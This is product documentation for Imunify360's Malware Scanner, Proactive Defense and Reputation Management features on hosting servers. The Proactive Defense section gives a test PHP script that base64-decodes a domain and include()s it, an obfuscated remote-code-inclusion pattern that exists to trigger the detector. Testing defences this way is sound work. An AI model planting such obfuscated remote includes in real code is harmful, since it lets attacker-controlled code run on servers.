## Malware Scanner

::: tip Note
 The functionality described here depends on <span class="notranslate">[Malware Scanner settings](/dashboard/#malware)</span>.
:::

Imunify360 <span class="notranslate">Malware Scanner</span> can scan file systems for malware injection and quarantine infected files.

This is also a real time file scanner for vulnerability and it can:

* scan files uploaded via FTP (supporting [Pure-FTPd](https://www.pureftpd.org/project/pure-ftpd))

* scan files uploaded via HTTP/HTTPS

* scan files for changes via [inotify](https://en.wikipedia.org/wiki/Inotify)

* scan on-demand (any folder needed)

::: tip Note
When using Mod_Security for real-time scans, it is only possible to detect file owner if Apache is running with `mod_ruid2` configured. In other cases, the user for these files will always be the user a web server is running under (usually <span class="notranslate">`nobody`</span>).
:::

Malware scanning allows you to:

* observe scanner activity
* start on-demand file scanner
* manage malicious and quarantined files
* manage Ignore List

## Proactive Defense


### Overview

 
<span class="notranslate">Proactive Defense</span> is a unique Imunify360 feature that can prevent malicious activity through PHP scripts. It is available as a PHP module for Apache and LiteSpeed web servers and analyzes script activity using known patterns like obfuscated command injection, malicious code planting, sending spam, SQL injection etc.

### User Interface

Go to <span class="notranslate">Imunify360 → Proactive Defense</span>.

![](/images/proactivedefensemain_zoom70.png)

Here you can set a mode, view detected events and perform actions on them.

![](/images/proactivedefensegeneralui_zoom70.png)

#### Mode Settings

The following <span class="notranslate">Proactive Defense</span> modes are available:
* <span class="notranslate">Disabled</span> — means that <span class="notranslate">Proactive Defense</span> feature is not working and a system is not protected enough (default mode)
* <span class="notranslate">Log Only</span> — means that possible malicious activity is only logged, no actions are performed
* <span class="notranslate">Kill Mode</span> — the highest level of protection — the script is terminated as soon as malicious activity is detected

To select a mode, tick the desired checkbox. When an action is completed, you will see a pop-up with the successful mode changing message.

**How to test Proactive Defense**

1. Set <span class="notranslate">Proactive Defense</span> to <span class="notranslate">_Log only_</span> mode (requests will not be blocked) or to <span class="notranslate">_Kill mode_</span> to kill all requests.
2. Create a file with the following content:

<div class="notranslate">

``` PHP
<?php
/* Imunify360 Proactive Defence test script */
echo "<pre>";
echo "Step 1<br>";
// Decode string with domain: 37kddsserrt.xyz
$url=base64_decode("MzdrZGRzc2VycnQueHl6");

// Try to access a malicious domain
include($url);

echo "Step 2<br>";
echo "</pre>";

?>
```
</div>

1. Place this file on the server.
2. Call a test page with the script from the point 2.
3. If <span class="notranslate">Proactive Defense</span> is disabled, you will see _Step 1_ and _Step 2_ strings after calling the script.
4. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Log only_</span> mode is set, you will see _Step 1_ and _Step 2_ strings after calling the script and a new event in the <span class="notranslate">_Detected Events_</span> table.
5. If <span class="notranslate">Proactive Defense</span> is enabled and <span class="notranslate">_Kill mode_</span> is set, the test page returns an error.

## Reputation Management

Choose <span class="notranslate">_Reputation Management_</span> in the main menu of the Imunify360 user interface to get to the <span class="notranslate">Reputation Management</span> page.

Based on the [Google Safe Browsing](https://safebrowsing.google.com/), the <span class="notranslate">Reputation Management</span> allows to check if a domain registered on your server is safe or not.

How does it work:

* We get a list of domains periodically (via crontab)
* Send it to the central Imunify360 server
* Get results from it
* Add bad domains to the list of <span class="notranslate">Reputation Management</span>

If a domain or an IP is blocked, then this information will be available in the table below. Imunify360 uses [Google Safe Browsing](https://safebrowsing.google.com/) technology. If a user’s website appears in this table, then it would be useful to send [this link](https://developers.google.com/webmasters/hacked/) to the user. This instruction can help to solve problems with the domain.

At the top of the page (also in the main menu near <span class="notranslate">Reputation Management</span> item), Imunify360 shows the number of affected domains. This number is a quantity of affected domains that exist on the server.

The table shows:

* <span class="notranslate">_ID_</span> – domain owner username
* _URL_ – the affected domain link
* <span class="notranslate">_Type_</span> – read more about types [on the link](https://developers.google.com/safe-browsing/v4/reference/rest/v4/ThreatType) (we still do not support <span class="notranslate">THREAT_TYPE_UNSPECIFIED</span> and <span class="notranslate">POTENTIALLY_HARMFUL_APPLICATION</span>).
* <span class="notranslate">_Detection time_</span> – exact time when the <span class="notranslate">Reputation Management</span> has detected the domain

![](/images/reputation_zoom73.png) 

Click link icon in the <span class="notranslate">_Action_</span> column to copy the URL to the clipboard.

::: tip Note
<span class="notranslate">Reputation Management</span> online and browser look may differ. This is because Google Safe Browsing has an issue described on github.
